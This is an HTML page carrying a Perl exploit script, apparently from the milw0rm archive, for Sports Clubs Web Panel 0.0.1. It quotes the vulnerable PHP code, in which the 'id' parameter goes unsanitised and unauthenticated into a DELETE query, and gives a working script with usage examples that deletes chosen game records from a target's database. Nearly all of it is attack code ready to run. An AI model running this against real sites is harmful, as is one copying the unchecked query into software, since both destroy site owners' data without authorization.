<html><head><title>Sports Clubs Web Panel 0.0.1 Remote Game Delete Exploit</title></head><pre>#!/usr/bin/perl -W

# Sports Clubs Web Panel 0.0.1 Remote Game Delete Exploit
# File affected: include/draw-delete.php (id)

# Vuln Code:

# 06:  $did = $_GET['id'];
# 08:  mysql_query(&quot;DELETE FROM draw WHERE did='$did'&quot;);

# by ka0x &lt;ka0x01 [at] gmail [dot] com&gt;
# D.O.M Labs - Security Researchers
# - www.domlabs.org -
#

# ka0x@domlabs:~/codes$ ./sportspanel.pl http://localhost/sportspanel 3


use LWP::UserAgent;

my $host = $ARGV[0];
my $did = $ARGV[1];

die &amp;_USAGE unless $ARGV[1];

sub _USAGE
{
	die &quot;
	- Sports Clubs Web Panel 0.0.1 Remote Game Delete Exploit -
	- by ka0x (www.domlabs.org)
	
	usage: ./$0 &lt;host&gt; &lt;valid_game_id&gt;
	ex: ./$0 http://localhost/sportspanel 2
	&quot;;
}

my $ua = LWP::UserAgent-&gt;new() or die;
$ua-&gt;agent(&quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008072820 Firefox/3.0.1&quot;);

my $req = HTTP::Request-&gt;new(GET =&gt; $host.&quot;/?p=draw-delete&amp;id=&quot;.$did);
my $res = $ua-&gt;request($req);
my $con = $res-&gt;content;

if ($res-&gt;is_success){
	if($con =~ /$did/){
		print &quot;[+] The Game \&quot;$did\&quot; has been deleted from the database!\n&quot;;
	}
}

else{
	print &quot;[-] Exploit Failed!&quot;;
}

__END__

# milw0rm.com [2008-09-13]</pre></html>